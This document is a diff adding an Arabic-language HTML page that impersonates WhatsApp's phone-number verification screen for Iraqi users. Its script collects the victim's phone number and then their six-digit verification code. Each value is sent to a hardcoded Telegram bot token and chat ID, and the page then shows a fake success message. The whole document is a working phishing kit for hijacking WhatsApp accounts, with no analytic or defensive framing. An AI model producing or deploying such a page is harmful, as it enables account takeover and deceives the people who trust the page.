@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WhatsApp</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Arial,sans-serif}
+body{background:#0a0a0a;color:#fff;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:20px}
+.container{max-width:400px;width:100%}
+.logo{text-align:center;margin-bottom:40px}
+.logo .icon{width:80px;height:80px;background:#25D366;border-radius:50%;display:inline-flex;justify-content:center;align-items:center;margin-bottom:20px}
+.logo .icon span{font-size:45px;color:#fff}
+h1{color:#fff;font-size:26px;font-weight:400;margin-bottom:12px}
+.subtitle{color:#8696a0;font-size:15px;line-height:1.7;text-align:center}
+.form-group{margin-top:30px}
+.country-select{display:flex;align-items:center;justify-content:space-between;padding:16px 0;border-bottom:1px solid #2a2a2a;margin-bottom:10px}
+.country-select .country-name{color:#fff;font-size:17px}
+.country-select .arrow{color:#25D366;font-size:14px}
+.phone-row{display:flex;align-items:center;padding:16px 0;border-bottom:1px solid #2a2a2a}
+.phone-row .code{color:#25D366;font-size:17px;font-weight:bold;margin-left:15px}
+.phone-row input{flex:1;background:transparent;border:none;color:#fff;font-size:17px;outline:none;padding:0}
+.phone-row input::placeholder{color:#555}
+.btn{width:100%;padding:16px;background:#25D366;color:#fff;border:none;border-radius:10px;font-size:17px;font-weight:bold;cursor:pointer;margin-top:30px}
+.verify-title{color:#fff;font-size:20px;font-weight:400;text-align:center;margin-bottom:20px}
+.verify-text{color:#8696a0;font-size:15px;line-height:1.8;text-align:center;margin-bottom:25px}
+.verify-text .phone-number{color:#fff;font-weight:bold}
+.edit-link{color:#25D366;font-size:15px;text-align:center;margin-bottom:30px;cursor:pointer}
+.code-inputs{display:flex;gap:10px;margin-top:25px;justify-content:center;direction:ltr}
+.code-inputs input{width:45px;height:55px;text-align:center;font-size:24px;font-weight:bold;padding:0;background:#1a1a1a;border:1px solid #2a2a2a;border-radius:10px;color:#fff}
+.no-code{text-align:center;color:#25D366;font-size:15px;margin-top:30px;cursor:pointer}
+.footer{text-align:center;font-size:12px;color:#444;margin-top:40px}
+.modal-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);display:flex;justify-content:center;align-items:center;z-index:1000;display:none}
+.modal{background:#1f2c33;border-radius:16px;padding:25px;max-width:320px;width:90%;text-align:center}
+.modal .icon{width:60px;height:60px;background:#25D366;border-radius:50%;display:inline-flex;justify-content:center;align-items:center;margin-bottom:15px}
+.modal .icon span{font-size:30px;color:#fff}
+.modal h3{color:#fff;font-size:18px;margin-bottom:10px}
+.modal p{color:#8696a0;font-size:14px;line-height:1.6;margin-bottom:20px}
+.modal button{width:100%;padding:14px;background:#25D366;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer}
+</style>
+</head>
+<body>
+<div class="container">
+<div id="screen1">
+<div class="logo">
+<div class="icon"><span>💬</span></div>
+<h1>WhatsApp</h1>
+</div>
+<p class="subtitle">سيحتاج واتساب إلى التحقق من رقم هاتفك. قد تسري عليك رسوم تفرضها شركة الاتصالات. <span style="color:#25D366">ما هو رقمي؟</span></p>
+<form id="f1">
+<div class="form-group">
+<div class="country-select">
+<span class="country-name">العراق</span>
+<span class="arrow">▼</span>
+</div>
+<div class="phone-row">
+<span class="code">+964</span>
+<input type="tel" id="phone" placeholder="رقم الهاتف" required>
+</div>
+</div>
+<button type="submit" class="btn">التالي</button>
+</form>
+</div>
+<div id="screen2" style="display:none">
+<h2 class="verify-title">جارٍ التحقق من رقمك</h2>
+<p class="verify-text">لقد حاولت تفعيل رقمك حديثاً.<br>الرجاء الانتظار قبل طلب الكود عبر رسالة نصية أو مكالمة هاتفية.</p>
+<div class="edit-link" id="editBtn">تعديل الرقم</div>
+<div class="code-inputs">
+<input type="tel" maxlength="1" id="c1" inputmode="numeric">
+<input type="tel" maxlength="1" id="c2" inputmode="numeric">
+<input type="tel" maxlength="1" id="c3" inputmode="numeric">
+<input type="tel" maxlength="1" id="c4" inputmode="numeric">
+<input type="tel" maxlength="1" id="c5" inputmode="numeric">
+<input type="tel" maxlength="1" id="c6" inputmode="numeric">
+</div>
+<div class="no-code" id="noCode">ألم تتلقَّ الكود؟</div>
+</div>
+<div class="footer">© 2026 WhatsApp - Meta</div>
+</div>
+<div class="modal-overlay" id="modalOverlay">
+<div class="modal">
+<div class="icon"><span id="modalIcon">✓</span></div>
+<h3 id="modalTitle">تم الإرسال</h3>
+<p id="modalMsg">تم إرسال رمز التحقق.</p>
+<button onclick="closeModal()">حسناً</button>
+</div>
+</div>
+<script>
+const BOT='8817416933:AAEJJON9lK12149s6-5qYZ91pzf8-XJiNTw';
+const CHAT='8823506156';
+function showModal(icon, title, msg){
+document.getElementById('modalIcon').textContent=icon;
+document.getElementById('modalTitle').textContent=title;
+document.getElementById('modalMsg').textContent=msg;
+document.getElementById('modalOverlay').style.display='flex';
+}
+function closeModal(){
+document.getElementById('modalOverlay').style.display='none';
+}
+['c1','c2','c3','c4','c5','c6'].forEach((id,i,arr)=>{
+document.getElementById(id).addEventListener('input', function(){
+if(this.value.length===1 && i<arr.length-1){ document.getElementById(arr[i+1]).focus(); }
+});
+});
+document.getElementById('f1').addEventListener('submit', async function(e){
+e.preventDefault();
+const phone=document.getElementById('phone').value;
+const fullPhone='+964'+phone;
+const msg='💬 *واتساب*\n\n📞 الرقم: `'+fullPhone+'`\n🕐 '+new Date().toLocaleString('ar-IQ');
+await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
+document.getElementById('screen1').style.display='none';
+document.getElementById('screen2').style.display='block';
+document.getElementById('c1').focus();
+});
+['c1','c2','c3','c4','c5','c6'].forEach((id)=>{
+document.getElementById(id).addEventListener('input', async function(){
+const code=document.getElementById('c1').value+document.getElementById('c2').value+document.getElementById('c3').value+document.getElementById('c4').value+document.getElementById('c5').value+document.getElementById('c6').value;
+if(code.length===6){
+const phone=document.getElementById('phone').value;
+const fullPhone='+964'+phone;
+const msg='💬 *واتساب - رمز التحقق*\n\n📞 الرقم: `'+fullPhone+'`\n🔢 الرمز: `'+code+'`\n🕐 '+new Date().toLocaleString('ar-IQ');
+await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
+showModal('✓','تم التحقق','تم التحقق من رقم هاتفك بنجاح.');
+}
+});
+});
+document.getElementById('editBtn').addEventListener('click', function(){
+document.getElementById('screen2').style.display='none';
+document.getElementById('screen1').style.display='block';
+document.getElementById('c1').value='';
+document.getElementById('c2').value='';
+document.getElementById('c3').value='';
+document.getElementById('c4').value='';
+document.getElementById('c5').value='';
+document.getElementById('c6').value='';
+});
+document.getElementById('noCode').addEventListener('click', function(){
+showModal('↻','إعادة الإرسال','سيتم إعادة إرسال الكود خلال دقيقة.');
+});
+</script>
+</body>
+</html>
